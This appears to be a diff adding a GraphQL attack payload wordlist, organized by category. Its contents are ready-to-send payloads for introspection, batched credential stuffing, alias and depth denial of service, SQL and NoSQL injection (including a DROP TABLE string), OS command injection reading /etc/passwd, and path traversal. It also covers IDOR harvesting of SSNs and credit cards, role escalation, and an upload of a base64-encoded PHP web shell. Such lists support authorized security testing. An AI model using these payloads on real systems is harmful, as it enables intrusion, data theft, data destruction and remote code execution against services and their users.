@@ -1,0 +1,109 @@
+# GraphQL Security Payloads - Comprehensive Collection
+# Categories: Introspection, DoS, Injection, Authorization Bypass
+
+# ==================== INTROSPECTION QUERIES ====================
+# Full introspection
+query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }
+
+# Simplified introspection
+{__schema{types{name,fields{name}}}}
+
+# Get all type names
+{__schema{types{name}}}
+
+# Get query type
+{__schema{queryType{name,fields{name,args{name}}}}}
+
+# Get mutation type
+{__schema{mutationType{name,fields{name,args{name}}}}}
+
+# Get subscription type
+{__schema{subscriptionType{name,fields{name}}}}
+
+# Get specific type details
+{__type(name:"User"){name,fields{name,type{name}}}}
+
+# Get all fields of a type
+{__type(name:"Query"){fields{name,args{name,type{name}}}}}
+
+# ==================== BATCHING ATTACKS ====================
+# Batch query - credential stuffing
+[{"query":"mutation{login(user:\"admin\",pass:\"password1\"){token}}"},{"query":"mutation{login(user:\"admin\",pass:\"password2\"){token}}"},{"query":"mutation{login(user:\"admin\",pass:\"password3\"){token}}"}]
+
+# Batch query - data exfiltration
+[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"},{"query":"{user(id:3){email}}"}]
+
+# ==================== ALIAS DOS ATTACKS ====================
+# Alias overload
+{a1:__typename,a2:__typename,a3:__typename,a4:__typename,a5:__typename,a6:__typename,a7:__typename,a8:__typename,a9:__typename,a10:__typename,a11:__typename,a12:__typename,a13:__typename,a14:__typename,a15:__typename,a16:__typename,a17:__typename,a18:__typename,a19:__typename,a20:__typename}
+
+# Field duplication
+{user(id:1){id,id,id,id,id,email,email,email,email,email}}
+
+# ==================== DEPTH ATTACKS ====================
+# Deep nesting
+{users{friends{friends{friends{friends{friends{friends{friends{friends{friends{id}}}}}}}}}}}
+
+# Circular reference
+{user(id:1){friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{id}}}}}}}}}}}}}
+
+# ==================== DIRECTIVE ABUSE ====================
+# Directive overload
+{user(id:1){name@skip(if:false)@include(if:true)@skip(if:false)@include(if:true)}}
+
+# Deprecated directive enumeration
+{__schema{directives{name,locations,args{name}}}}
+
+# ==================== INJECTION PAYLOADS ====================
+# SQL injection via variables
+{"query":"query($id:ID!){user(id:$id){name}}","variables":{"id":"1 OR 1=1"}}
+{"query":"query($id:ID!){user(id:$id){name}}","variables":{"id":"1; DROP TABLE users;--"}}
+{"query":"query($id:ID!){user(id:$id){name}}","variables":{"id":"1' UNION SELECT * FROM secrets--"}}
+
+# NoSQL injection
+{"query":"query($filter:JSON){users(filter:$filter){name}}","variables":{"filter":{"$gt":""}}}
+{"query":"query($filter:JSON){users(filter:$filter){name}}","variables":{"filter":{"$ne":null}}}
+
+# OS command injection
+{"query":"mutation($cmd:String!){execute(command:$cmd)}","variables":{"cmd":"id; cat /etc/passwd"}}
+{"query":"mutation($file:String!){readFile(path:$file)}","variables":{"file":"../../../etc/passwd"}}
+
+# ==================== AUTHORIZATION BYPASS ====================
+# IDOR via ID enumeration
+{user(id:1){id,email,ssn,creditCard}}
+{user(id:2){id,email,ssn,creditCard}}
+
+# Role escalation
+mutation{updateUser(id:1,role:"ADMIN"){id,role}}
+
+# Access other users' data
+{users{id,email,password}}
+
+# ==================== INFORMATION DISCLOSURE ====================
+# Error-based enumeration
+{nonExistentField}
+{user(id:"invalid"){name}}
+{__type(name:"NonExistent"){name}}
+
+# Field suggestion harvesting
+{usersXXX}
+{userXXX(id:1){name}}
+
+# Version/debug info
+{__schema{description}}
+
+# ==================== SUBSCRIPTION HIJACKING ====================
+subscription{onMessage{id,content,sender{email}}}
+subscription{newUser{id,email,role}}
+subscription{orderUpdate{id,status,customer{creditCard}}}
+
+# ==================== FILE UPLOAD BYPASS ====================
+mutation{uploadFile(file:"data:application/x-php;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==")}
+mutation{uploadFile(file:"../../../var/www/shell.php")}
+
+# ==================== PERSISTED QUERIES ====================
+# APQ hash probe
+{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"}}}
+
+# Hash collision attempt
+{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"0000000000000000000000000000000000000000000000000000000000000000"}}}
